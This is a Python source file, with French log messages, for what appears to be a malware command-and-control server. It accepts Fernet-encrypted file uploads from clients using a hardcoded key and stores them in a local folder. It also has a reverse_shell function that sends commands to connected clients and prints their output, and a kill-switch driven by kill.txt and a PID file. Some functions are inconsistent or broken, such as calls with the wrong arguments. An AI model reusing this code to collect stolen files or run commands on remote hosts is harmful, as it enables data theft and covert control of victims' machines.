import socket
from cryptography.fernet import Fernet
import os
import sys
import psutil
import json 
from datetime import datetime
import subprocess

tab_conn =[]

def handle_client(conn, cipher_suite):
    try:
        tabData = []
        while True:
            send_kill_message(tab_conn)
            data = conn.recv(1024)
            if not data:
                break
            
            decrypted_data = cipher_suite.decrypt(data).decode("utf-8")
            print(decrypted_data)
            tabData.append(decrypted_data)
            if len(tabData) == 2:
                filename = tabData[0]
                with open("./files/" + filename, 'a+') as file:
                    file.write(tabData[1])
                tabData = []
    finally:
        if verif_kill()and socket_alive(tab_conn) == False:
            p = psutil.Process(get_pid())
            p.terminate()
        
        conn.close()

def socket_alive(tab_conn):
    for conn in tab_conn:
        if conn.fileno() == -1:
            return False
    return True


def clean():
    sys.exit(0)

def verif_kill():
    if os.path.exists("kill.txt"):
        os.remove("kill.txt")
    return True
def get_pid():
    with open('serverpid.txt','r') as file:
        pid = file.read()
    return int(pid)

def write_pid():
    with open('serverpid.txt','w') as file:
        file.write(str(os.getpid()))

def save_data_to_file(data, filename, client_address, timestamp):
    folder_name = "files"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

    with open(os.path.join(folder_name, filename), 'w') as file:
        file.write(data)


def decrypt_data(data, key):
    cipher_suite = Fernet(key)
    decrypted_data = cipher_suite.decrypt(data)
    return decrypted_data.decode()


def get_socket(server_address, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    client_socket.bind((server_address, server_port))
    client_socket.listen(5)
    print("Serveur en écoute")

    return client_socket

def server_conn(server_socket):
    write_pid()
    
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="

    print("Serveur en écoute")

    while True:
        conn, address_client = server_socket.accept()
        tab_conn.append(conn)
        print(f"Nouvelle connexion de {address_client} \n")

        # client_handler = threading.Thread(target=handle_client, args=(conn, cipher_suite))
        # client_handler.start()

        data = conn.recv(10240)
        conn.close()

        if data:
            decrypted_data = decrypt_data(data, key)
            filename, lines = json.loads(decrypted_data)
            timestamp = datetime.now().strftime('%Y%m%d%H%M%S')

            save_data_to_file(lines, filename, address_client, timestamp)
            break
        else:
            print("> No data \n")

    
def send_kill_message(server_socket, tab_conn):
    conn, address_client = server_socket.accept()
    
    if os.path.exists('kill.txt') == True:

        message = "kill"
        for conn in tab_conn:
            conn.send(message.encode("utf-8"))
    else:
        print("[ERROR] send_kill_message \n")
            
            

def readfile(option):
    filename = option
    try:
        with open("./files/"+filename, 'r') as file:
            print(file.read())
    except FileNotFoundError:
        print(f"[EXCEPTION] Le fichier {filename} n'existe pas sur le serveur. \n")

# def listen(option):    
def listen(server_socket, option):    
    port = option

    # server_socket = get_socket("127.0.0.1", 12345)

    # server_conn("127.0.0.1", port)
    server_conn(server_socket)

def show():
    files=os.listdir("./files/")
    print("> Liste des fichiers dans le serveur \n")
    for file in files:
        print(file)

def kill_all_servers(server_socket):
    print("> Arrêt du serveur en cours... \n")
    with open('kill.txt','w+') as file:
        file.write('kill')

    print("heho")
    send_kill_message(server_socket, tab_conn)

    
def reverse_shell(server_socket, option):
    try:
        print("Serveur en écoute \n")

        conn, address_client = server_socket.accept()
        tab_conn.append(conn)
        print(f"Nouvelle connexion de {address_client} \n")

        conn.send(option.encode())

        result = conn.recv(1024).decode()
        print(f"Response: \n{result}")

        conn.close()

    except subprocess.CalledProcessError as e:
        print(f"[EXCEPTION] reverse_shell: {e}")


